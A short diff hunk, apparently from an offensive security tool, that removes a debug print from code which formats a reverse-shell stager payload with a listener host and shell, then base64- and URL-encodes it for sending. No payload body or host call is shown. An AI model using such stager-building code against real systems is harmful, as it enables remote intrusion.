@@ -86,7 +86,6 @@ class Data:
                 payload_file.close()
             else:
                 payload = stager_payload.format(lhost, shell)
-                print(payload)
 
             encoded_payload = quote_plus(payload.encode('base64'))
 
